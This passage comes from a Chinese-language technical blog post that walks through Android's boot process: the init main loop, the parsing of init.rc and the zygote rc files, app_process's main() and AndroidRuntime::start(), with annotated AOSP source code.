&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span>&amp; svc : ServiceList::<span class="hljs-built_in">GetInstance</span>()) &#123;<br>                keychords.<span class="hljs-built_in">Register</span>(svc-&gt;<span class="hljs-built_in">keycodes</span>());<br>            &#125;<br>            keychords.<span class="hljs-built_in">Start</span>(&amp;epoll, HandleKeychord);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">Success</span>();<br>        &#125;,<br>        <span class="hljs-string">&quot;KeychordInit&quot;</span>);<br> <br>    <span class="hljs-comment">//在屏幕上显示Android 静态LOGO</span><br>    am.<span class="hljs-built_in">QueueBuiltinAction</span>(console_init_action, <span class="hljs-string">&quot;console_init&quot;</span>);<br> <br>    <span class="hljs-comment">// 执行rc文件中触发器为on init的语句</span><br>    am.<span class="hljs-built_in">QueueEventTrigger</span>(<span class="hljs-string">&quot;init&quot;</span>);<br> <br>    <span class="hljs-comment">// Starting the BoringSSL self test, for NIAP certification compliance.</span><br>    am.<span class="hljs-built_in">QueueBuiltinAction</span>(StartBoringSslSelfTest, <span class="hljs-string">&quot;StartBoringSslSelfTest&quot;</span>);<br> <br>    <span class="hljs-comment">// Repeat mix_hwrng_into_linux_rng in case /dev/hw_random or /dev/random</span><br>    <span class="hljs-comment">// wasn&#x27;t ready immediately after wait_for_coldboot_done</span><br>    am.<span class="hljs-built_in">QueueBuiltinAction</span>(MixHwrngIntoLinuxRngAction, <span class="hljs-string">&quot;MixHwrngIntoLinuxRng&quot;</span>);<br> <br>    <span class="hljs-comment">// Initialize binder before bringing up other system services</span><br>    am.<span class="hljs-built_in">QueueBuiltinAction</span>(InitBinder, <span class="hljs-string">&quot;InitBinder&quot;</span>);<br> <br>    <span class="hljs-comment">// 当设备处于充电模式时，不需要mount文件系统或者启动系统服务</span><br>    <span class="hljs-comment">// 充电模式下，将charger假如执行队列，否则把late-init假如执行队列</span><br>    std::string bootmode = <span class="hljs-built_in">GetProperty</span>(<span class="hljs-string">&quot;ro.bootmode&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">if</span> (bootmode == <span class="hljs-string">&quot;charger&quot;</span>) &#123;<br>        am.<span class="hljs-built_in">QueueEventTrigger</span>(<span class="hljs-string">&quot;charger&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        am.<span class="hljs-built_in">QueueEventTrigger</span>(<span class="hljs-string">&quot;late-init&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-comment">// 基于属性当前状态 运行所有的属性触发器.</span><br>    am.<span class="hljs-built_in">QueueBuiltinAction</span>(queue_property_triggers_action, <span class="hljs-string">&quot;queue_property_triggers&quot;</span>);<br> <br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-comment">// By default, sleep until something happens.</span><br>        <span class="hljs-keyword">auto</span> epoll_timeout = std::optional&lt;std::chrono::milliseconds&gt;&#123;&#125;;<br> <br>        <span class="hljs-keyword">if</span> (do_shutdown &amp;&amp; !shutting_down) &#123;<br>            do_shutdown = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">HandlePowerctlMessage</span>(shutdown_command)) &#123;<br>                shutting_down = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br> <br><span class="hljs-comment">//依次执行每个action中携带command对应的执行函数</span><br>        <span class="hljs-keyword">if</span> (!(waiting_for_prop || Service::<span class="hljs-built_in">is_exec_service_running</span>())) &#123;<br>            am.<span class="hljs-built_in">ExecuteOneCommand</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!(waiting_for_prop || Service::<span class="hljs-built_in">is_exec_service_running</span>())) &#123;<br>            <span class="hljs-keyword">if</span> (!shutting_down) &#123;<br>                <span class="hljs-keyword">auto</span> next_process_action_time = <span class="hljs-built_in">HandleProcessActions</span>();<br> <br>                <span class="hljs-comment">// If there&#x27;s a process that needs restarting, wake up in time for that.</span><br>                <span class="hljs-keyword">if</span> (next_process_action_time) &#123;<br>                    epoll_timeout = std::chrono::ceil&lt;std::chrono::milliseconds&gt;(<br>                            *next_process_action_time - boot_clock::<span class="hljs-built_in">now</span>());<br>                    <span class="hljs-keyword">if</span> (*epoll_timeout &lt; <span class="hljs-number">0</span>ms) epoll_timeout = <span class="hljs-number">0</span>ms;<br>                &#125;<br>            &#125;<br> <br>            <span class="hljs-comment">// If there&#x27;s more work to do, wake up again immediately.</span><br>            <span class="hljs-keyword">if</span> (am.<span class="hljs-built_in">HasMoreCommands</span>()) epoll_timeout = <span class="hljs-number">0</span>ms;<br>        &#125;<br> <br>        <span class="hljs-comment">// 循环等待事件发生</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span> result = epoll.<span class="hljs-built_in">Wait</span>(epoll_timeout); !result) &#123;<br>            <span class="hljs-built_in">LOG</span>(ERROR) &lt;&lt; result.<span class="hljs-built_in">error</span>();<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>LoadBootScripts方法：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">static void <span class="hljs-constructor">LoadBootScripts(ActionManager&amp; <span class="hljs-params">action_manager</span>, ServiceList&amp; <span class="hljs-params">service_list</span>)</span> &#123;<br>    Parser parser = <span class="hljs-constructor">CreateParser(<span class="hljs-params">action_manager</span>, <span class="hljs-params">service_list</span>)</span>;<br><br>    std::<span class="hljs-built_in">string</span> bootscript = <span class="hljs-constructor">GetProperty(<span class="hljs-string">&quot;ro.boot.init_rc&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)</span>;<br>    <span class="hljs-keyword">if</span> (bootscript.empty<span class="hljs-literal">()</span>) &#123;<br>        parser.<span class="hljs-constructor">ParseConfig(<span class="hljs-string">&quot;/init.rc&quot;</span>)</span>;<br>        <span class="hljs-keyword">if</span> (!parser.<span class="hljs-constructor">ParseConfig(<span class="hljs-string">&quot;/system/etc/init&quot;</span>)</span>) &#123;<br>            late_import_paths.emplace<span class="hljs-constructor">_back(<span class="hljs-string">&quot;/system/etc/init&quot;</span>)</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!parser.<span class="hljs-constructor">ParseConfig(<span class="hljs-string">&quot;/product/etc/init&quot;</span>)</span>) &#123;<br>            late_import_paths.emplace<span class="hljs-constructor">_back(<span class="hljs-string">&quot;/product/etc/init&quot;</span>)</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!parser.<span class="hljs-constructor">ParseConfig(<span class="hljs-string">&quot;/product_services/etc/init&quot;</span>)</span>) &#123;<br>            late_import_paths.emplace<span class="hljs-constructor">_back(<span class="hljs-string">&quot;/product_services/etc/init&quot;</span>)</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!parser.<span class="hljs-constructor">ParseConfig(<span class="hljs-string">&quot;/odm/etc/init&quot;</span>)</span>) &#123;<br>            late_import_paths.emplace<span class="hljs-constructor">_back(<span class="hljs-string">&quot;/odm/etc/init&quot;</span>)</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!parser.<span class="hljs-constructor">ParseConfig(<span class="hljs-string">&quot;/vendor/etc/init&quot;</span>)</span>) &#123;<br>            late_import_paths.emplace<span class="hljs-constructor">_back(<span class="hljs-string">&quot;/vendor/etc/init&quot;</span>)</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        parser.<span class="hljs-constructor">ParseConfig(<span class="hljs-params">bootscript</span>)</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-4-三阶段启动init-rc"><a href="#2-4-三阶段启动init-rc" class="headerlink" title="2.4 三阶段启动init.rc"></a>2.4 三阶段启动init.rc</h3><p>当属性服务建立完成后，init的自身功能基本就告一段落，接下来需要来启动其他的进程。但是init进程如何其他其他进程呢？其他进程都是一个二进制文件，我们可以直接通过exec的命令方式来启动，例如 ./system/bin/init second_stage，来启动init进程的第二阶段。但是Android系统有那么多的Native进程，如果都通过传exec在代码中一个个的来执行进程，那无疑是一个灾难性的设计。</p><p>在这个基础上Android推出了一个init.rc的机制，即类似通过读取配置文件的方式，来启动不同的进程。接下来我们就来看看init.rc是如何工作的。</p><p>init.rc是一个配置文件，内部由Android初始化语言编写（Android Init Language）编写的脚本。</p><p>init.rc在手机的目录：./init.rc</p><p>启动zygote的.rc文件位于system/core/rootdir/init.rc</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>.....<br><br><span class="hljs-regexp">//</span>根据系统ro.zygote属性来启动对应位数(<span class="hljs-number">32</span>/<span class="hljs-number">64</span>)进程<br><span class="hljs-regexp">//</span>ro.zygote 为zygote32<span class="hljs-regexp">/zygote32_64/</span>zygote64_32/zygote64<br>import /init.<span class="hljs-variable">$&#123;ro.zygote&#125;</span>.rc<br><br><br>on zygote-start &amp;&amp; property:ro.crypto.state=unencrypted<br>    <br>    start netd  <span class="hljs-regexp">//</span>启动网络相关守护进程<br>    start zygote    <span class="hljs-regexp">//</span>启动zygote<br>    start zygote_secondary <span class="hljs-regexp">//</span>启动zygote_secondary<br>.....<br><br></code></pre></td></tr></table></figure><p>android10 ro.zygote系统默认为zygote64_32，当 ro.zygote为zygote32</p><p>import /init.zygote32.rc,对应rc文件为 system/core/rootdir/init.zygote32.rc</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-comment">//通过system/bin/app_process命令启动zygote</span><br>service zygote <span class="hljs-regexp">/system/</span>bin<span class="hljs-regexp">/app_process -Xzygote /</span>system/bin --zygote --start-system-server<br>    <span class="hljs-keyword">class</span> main<br>    priority -<span class="hljs-number">20</span><br>    user root<br>    <span class="hljs-keyword">group</span> root readproc reserved_disk<br>    socket zygote stream <span class="hljs-number">660</span> root system <span class="hljs-comment">//注册socks服务</span><br>    socket usap_pool_primary stream <span class="hljs-number">660</span> root system<br>    onrestart <span class="hljs-keyword">write</span> <span class="hljs-regexp">/sys/</span>android_power/request_state wake<br>    onrestart <span class="hljs-keyword">write</span> <span class="hljs-regexp">/sys/</span><span class="hljs-keyword">power</span>/state on<br>    onrestart restart audioserver<br>    onrestart restart cameraserver<br>    onrestart restart media<br>    onrestart restart netd<br>    onrestart restart wificond<br>    writepid <span class="hljs-regexp">/dev/</span>cpuset<span class="hljs-regexp">/foreground/</span>tasks<br></code></pre></td></tr></table></figure><p>当 ro.zygote 为zygote64_32</p><p>import /init.zygote64_32.rc,对应rc文件为 system/core/rootdir/init.zygote64_32.rc,为了兼容32位应用会同时开启64位和32位两个zygote进程，且优先使用64位。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>通过system<span class="hljs-regexp">/bin/</span>app_process64命令启动zygote<br>service zygote <span class="hljs-regexp">/system/</span>bin<span class="hljs-regexp">/app_process64 -Xzygote /</span>system/bin --zygote --start-system-server --socket-name=zygote<br>    class main<br>    priority -<span class="hljs-number">20</span><br>    user root<br>    group root readproc reserved_disk<br>    socket zygote stream <span class="hljs-number">660</span> root system <span class="hljs-regexp">//</span>注册socks服务<br>    socket usap_pool_primary stream <span class="hljs-number">660</span> root system<br>    onrestart write <span class="hljs-regexp">/sys/</span>android_power/request_state wake<br>    onrestart write <span class="hljs-regexp">/sys/</span>power/state on<br>    onrestart restart audioserver<br>    onrestart restart cameraserver<br>    onrestart restart media<br>    onrestart restart netd<br>    onrestart restart wificond<br>    writepid <span class="hljs-regexp">/dev/</span>cpuset<span class="hljs-regexp">/foreground/</span>tasks<br><br><span class="hljs-regexp">//</span>通过system<span class="hljs-regexp">/bin/</span>app_process32命令启动zygote<br>service zygote_secondary <span class="hljs-regexp">/system/</span>bin<span class="hljs-regexp">/app_process32 -Xzygote /</span>system/bin --zygote --socket-name=zygote_secondary --enable-lazy-preload<br>    class main<br>    priority -<span class="hljs-number">20</span><br>    user root<br>    group root readproc reserved_disk<br>    socket zygote_secondary stream <span class="hljs-number">660</span> root system <span class="hljs-regexp">//</span>注册socks服务<br>    socket usap_pool_secondary stream <span class="hljs-number">660</span> root system<br>    onrestart restart zygote<br>    writepid <span class="hljs-regexp">/dev/</span>cpuset<span class="hljs-regexp">/foreground/</span>tasks<br></code></pre></td></tr></table></figure><p>如上，可以看到服务名（进程名）是zygote，对应的可执行程序是app_processXX，而且还创建了一个名为zygote的unix domain socket，类型是stream，这个socket是为了后面IPC所用；上面可以看到还有一个zygote_secondary的进程，其实这是为了适配不同的abi型号</p><p>其中Zygote进程能够重启的地方有,以下进程杀死，Zygote重启</p><p>servicemanager进程被杀<br>surfaceflinger进程被杀<br>Zygote进程自己被杀<br>system_server进程被杀</p><h3 id="2-5-运行-system-bin-app-processXX"><a href="#2-5-运行-system-bin-app-processXX" class="headerlink" title="2.5 运行/system/bin/app_processXX"></a>2.5 运行/system/bin/app_processXX</h3><p>接下来看看zygote启动过程，zygote对应的可执行文件就是/system/bin/app_processXX，也就是说系统启动时会执行到这个可执行文件的main()函数里</p><p>源码位于 frameworks/base/cmds/app_process/app_main.cpp,部分代码如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* <span class="hljs-keyword">const</span> argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  ......<br>  <br>  <span class="hljs-comment">// 创建 AppRuntime的成员变量</span><br>  <br>    <span class="hljs-function">AppRuntime <span class="hljs-title">runtime</span><span class="hljs-params">(argv[<span class="hljs-number">0</span>], computeArgBlockSize(argc, argv))</span></span>;<br> <br>    argc--;<br>    argv++;<br><br>   <br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; argc; i++) &#123;<br>        <span class="hljs-keyword">if</span> (argv[i][<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;-&#x27;</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (argv[i][<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;-&#x27;</span> &amp;&amp; argv[i][<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>) &#123;<br>            ++i; <span class="hljs-comment">// Skip --.</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        runtime.<span class="hljs-built_in">addOption</span>(<span class="hljs-built_in">strdup</span>(argv[i]));<br>    &#125;<br><br>  <span class="hljs-comment">// 解析运行时参数，赋值zygote和startSystemServer</span><br>  <br>    <span class="hljs-keyword">bool</span> zygote = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">bool</span> startSystemServer = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">bool</span> application = <span class="hljs-literal">false</span>;<br>    String8 niceName;<br>    String8 className;<br><br>    ++i;  <span class="hljs-comment">// Skip unused &quot;parent dir&quot; argument.</span><br>    <span class="hljs-keyword">while</span> (i &lt; argc) &#123;<br>        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* arg = argv[i++];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(arg, <span class="hljs-string">&quot;--zygote&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>            zygote = <span class="hljs-literal">true</span>;<br>            niceName = ZYGOTE_NICE_NAME;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(arg, <span class="hljs-string">&quot;--start-system-server&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>            startSystemServer = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(arg, <span class="hljs-string">&quot;--application&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>            application = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(arg, <span class="hljs-string">&quot;--nice-name=&quot;</span>, <span class="hljs-number">12</span>) == <span class="hljs-number">0</span>) &#123;<br>            niceName.<span class="hljs-built_in">setTo</span>(arg + <span class="hljs-number">12</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(arg, <span class="hljs-string">&quot;--&quot;</span>, <span class="hljs-number">2</span>) != <span class="hljs-number">0</span>) &#123;<br>            className.<span class="hljs-built_in">setTo</span>(arg);<br>            <span class="hljs-keyword">break</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            --i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    .......<br>     <br>    <span class="hljs-keyword">if</span> (zygote) &#123;<br>     <span class="hljs-comment">// 调用 ZygoteInit#main()</span><br>        runtime.<span class="hljs-built_in">start</span>(<span class="hljs-string">&quot;com.android.internal.os.ZygoteInit&quot;</span>, args, zygote);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className) &#123;<br>        runtime.<span class="hljs-built_in">start</span>(<span class="hljs-string">&quot;com.android.internal.os.RuntimeInit&quot;</span>, args, zygote);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Error: no class name or --zygote supplied.\n&quot;</span>);<br>        <span class="hljs-built_in">app_usage</span>();<br>        <span class="hljs-built_in">LOG_ALWAYS_FATAL</span>(<span class="hljs-string">&quot;app_process: no class name or --zygote supplied.&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>;<br>    &#125;<br><br><br></code></pre></td></tr></table></figure><p>上述代码，首先创建了一个AppRuntime的局部成员变量，然后对入参进行了解析，根据对init.zygote64_32.rc传入参数的分析，这里的zygote变量和startSystemServer的值均为true，因此在最后调用AppRuntime#start()函数时走了,而AppRuntime继承了AndroidRuntime，而子类里没有start方法，所以此处调用了AndroidRuntime::start()</p><h3 id="2-6-AndroidRuntime-start"><a href="#2-6-AndroidRuntime-start" class="headerlink" title="2.6 AndroidRuntime::start()"></a>2.6 AndroidRuntime::start()</h3><p>AndroidRuntime类位于frameworks/base/core/jni/AndroidRuntime.cpp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">void</span> AndroidRuntime::start(<span class="hljs-keyword">const</span> char* className, <span class="hljs-keyword">const</span> Vector&lt;String8&gt;&amp; options, <span class="hljs-keyword">bool</span> zygote)<br>&#123;<br>    <br>    <span class="hljs-comment">/* start the virtual machine */</span><br>    JniInvocation jni_invocation;<br>    jni_invocation.Init(<span class="hljs-literal">NULL</span>);  <span class="hljs-comment">//加载libart.so、导出三个主要jni方法(JNI_GetDefaultJavaVMInitArgs、JNI_CreateJavaVM、JNI_GetCreatedJavaVMs)</span><br>    JNIEnv* env;<br>     <span class="hljs-comment">// 虚拟机创建，主要篇幅是关于虚拟机参数的设置</span><br>    <span class="hljs-keyword">if</span> (startVm(&amp;mJavaVM, &amp;env, zygote) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    onVmCreated(env);<br><br>    <span class="hljs-comment">// JNI方法注册</span><br>    <span class="hljs-keyword">if</span> (startReg(env) &lt; <span class="hljs-number">0</span>) &#123;<br>        ALOGE(<span class="hljs-string">&quot;Unable to register all android natives\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    jclass stringClass;<br>    jobjectArray strArray;<br>    jstring classNameStr;<br><br>    <span class="hljs-comment">//等价 strArray= new String[options.size() + 1];</span><br>    stringClass = env-&gt;FindClass(<span class="hljs-string">&quot;java/lang/String&quot;</span>);<br>    assert(stringClass != <span class="hljs-literal">NULL</span>);<br>    <br>    <span class="hljs-comment">//等价 strArray[0] = &quot;com.android.internal.os.ZygoteInit&quot;</span><br>    strArray = env-&gt;NewObjectArray(options.size() + <span class="hljs-number">1</span>, stringClass, <span class="hljs-literal">NULL</span>);<br>    assert(strArray != <span class="hljs-literal">NULL</span>);<br>    classNameStr = env-&gt;NewStringUTF(className);<br>    assert(classNameStr != <span class="hljs-literal">NULL</span>);<br>    env-&gt;SetObjectArrayElement(strArray, <span class="hljs-number">0</span>, classNameStr);<br><br>    <span class="hljs-comment">//等价 strArray[1] = &quot;start-system-server&quot;；</span><br>    <span class="hljs-comment">//    strArray[2] = &quot;--abi-list=xxx&quot;；</span><br>    <span class="hljs-comment">//其中xxx为系统响应的cpu架构类型，比如arm64-v8a.</span><br>    <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; options.size(); ++i) &#123;<br>        jstring optionsStr = env-&gt;NewStringUTF(options.itemAt(i).<span class="hljs-keyword">string</span>());<br>        assert(optionsStr != <span class="hljs-literal">NULL</span>);<br>        env-&gt;SetObjectArrayElement(strArray, i + <span class="hljs-number">1</span>, optionsStr);<br>    &#125;<br><br>   <br>     <span class="hljs-comment">//将&quot;com.android.internal.os.ZygoteInit&quot;转换为&quot;com/android/internal/os/ZygoteInit&quot;</span><br>    char* slashClassName = toSlashClassName(className);<br>    <span class="hljs-comment">//找到Zygoteinit类</span><br>    jclass startClass = env-&gt;FindClass(slashClassName);<br>    <span class="hljs-keyword">if</span> (startClass == <span class="hljs-literal">NULL</span>) &#123;<br>        ALOGE(<span class="hljs-string">&quot;JavaVM unable to locate class &#x27;%s&#x27;\n&quot;</span>, slashClassName);<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//找到这个类后就继续找成员函数main方法的Mehtod ID</span><br>        jmethodID startMeth = env-&gt;GetStaticMethodID(startClass, <span class="hljs-string">&quot;main&quot;</span>,<br>            <span class="hljs-string">&quot;([Ljava/lang/String;)V&quot;</span>);<br>        <span class="hljs-keyword">if</span> (startMeth == <span class="hljs-literal">NULL</span>) &#123;<br>            ALOGE(<span class="hljs-string">&quot;JavaVM unable to find main() in &#x27;%s&#x27;\n&quot;</span>, className);<br> <br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 通过反射调用ZygoteInit.main()方法</span><br>            env-&gt;CallStaticVoidMethod(startClass, startMeth, strArray);<br><br>        &#125;<br>    &#125;<br>     <span class="hljs-comment">//释放相应对象的内存空间</span><br>    free(slashClassName);<br><br>   .....<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数启动了 Android 系统运行时库，其中它主要做了三件事：</p><ol><li>调用startVmVM()函数启动虚拟机</li><li>调用startReg()函数注册 Android 的 Java 方法，其实在这里就是 JNI 方法</li><li>反射调用 Java 类com.android.internal.os.ZygoteInit#main()方法，并把 fork zygote进程时的参数传入用来辅助初始化zygote进程</li></ol><h3 id="2-7-AndroidRuntime-startVm"><a href="#2-7-AndroidRuntime-startVm" class="headerlink" title="2.7 AndroidRuntime::startVm()"></a>2.7 AndroidRuntime::startVm()</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">AndroidRuntime::startVm</span><span class="hljs-params">(JavaVM** pJavaVM, JNIEnv** pEnv, <span class="hljs-keyword">bool</span> zygote)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// JNI检测功能，用于native层调用jni函数时进行常规检测，比较弱字符串格式是否符合要求，资源是否正确释放。该功能一般用于早期系统调试或手机Eng版，对于User版往往不会开启，引用该功能比较消耗系统CPU资源，降低系统性能。</span><br>    <span 